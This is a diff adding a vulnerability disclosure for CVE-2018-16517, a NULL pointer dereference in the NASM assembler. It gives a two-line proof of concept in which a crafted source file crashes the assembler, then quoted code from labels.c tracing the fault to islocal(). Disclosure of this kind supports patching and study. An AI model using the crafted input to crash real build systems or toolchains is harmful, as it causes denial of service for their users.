@@ -1,0 +1,51 @@
+# Exploit Title: Netwide Assembler (NASM) 2.14rc15 NULL Pointer Dereference (PoC)
+# Date: 2018-09-05
+# Exploit Author: Fakhri Zulkifli
+# Vendor Homepage: https://www.nasm.us/
+# Software Link: https://www.nasm.us/pub/nasm/releasebuilds/?C=M;O=D
+# Version: 2.14rc15 and earlier
+# Tested on: 2.14rc15
+# CVE : CVE-2018-16517
+
+asm/labels.c in Netwide Assembler (NASM) is prone to NULL Pointer Dereference, which allows the attacker to cause a denial of service via a crafted file.
+
+PoC:
+1. echo "equ   push  rax" > poc
+2. nasm -f elf poc
+
+insn_is_label remains FALSE and therefore leaving result->label assigned to NULL which is then dereference in islocal().
+ 
+   [...]
+    
+    if (i == TOKEN_ID || (insn_is_label && i == TOKEN_INSN)) {    <-- not taken
+        /* there's a label here */
+        first = false;
+        result->label = tokval.t_charptr;
+        i = stdscan(NULL, &tokval);
+        if (i == ':') {         /* skip over the optional colon */
+            i = stdscan(NULL, &tokval);
+        } else if (i == 0) {
+            nasm_error(ERR_WARNING | ERR_WARN_OL | ERR_PASS1,
+                  "label alone on a line without a colon might be in error");
+        }
+        if (i != TOKEN_INSN || tokval.t_integer != I_EQU) {
+            /*
+             * FIXME: location.segment could be NO_SEG, in which case
+             * it is possible we should be passing 'absolute.segment'. Look into this.
+             * Work out whether that is *really* what we should be doing.
+             * Generally fix things. I think this is right as it is, but
+             * am still not certain.
+             */
+            define_label(result->label,
+                         in_absolute ? absolute.segment : location.segment,
+                         location.offset, true);
+    [...]
+
+static bool islocal(const char *l)
+{
+    if (tasm_compatible_mode) {
+        if (l[0] == '@' && l[1] == '@')
+            return true;
+    }
+    return (l[0] == '.' && l[1] != '.');  <-- boom
+}
